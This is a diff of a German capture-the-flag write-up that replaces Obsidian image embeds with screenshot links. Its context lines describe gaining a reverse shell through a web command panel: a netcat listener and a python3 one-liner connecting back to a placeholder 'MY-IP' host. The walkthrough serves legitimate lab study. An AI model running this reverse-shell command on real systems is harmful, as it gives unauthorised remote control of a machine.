@@ -135,7 +135,7 @@ Ich kann also über `python3` eine Reverse Shell erzeugen.
 📍 **Angreifer-Seite (mein Rechner):**  
 Ich habe mit Netcat auf meinem Rechner einen Listener gestartet:
 
-![[Pasted image 20250513230039.png]]
+[![](./screenshots/12.png)](./screenshots/12.png)
 
 📍 **Zielseite (über das Command Panel):**  
 Dann habe ich folgenden Befehl eingegeben:
@@ -146,12 +146,12 @@ python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("MY-IP",444
 
 📌 **Wichtig:** Die IP-Adresse (`MY-IP`) musste natürlich durch meine eigene lokale oder VPN-IP ersetzt werden.
 
-![[Pasted image 20250513231647.png]]
+[![](./screenshots/13.png)](./screenshots/13.png)
 
 ✅ **Ergebnis:**  
 Ich erhielt erfolgreich eine Shell auf dem Zielsystem – **interaktiv und mit eingeschränkten Rechten**.
 
-![[Pasted image 20250513231752.png]]
+[![](./screenshots/14.png)](./screenshots/14.png)
 
 
 ## 🏁 Schritt 8: Erste Zutat (Flagge) finden
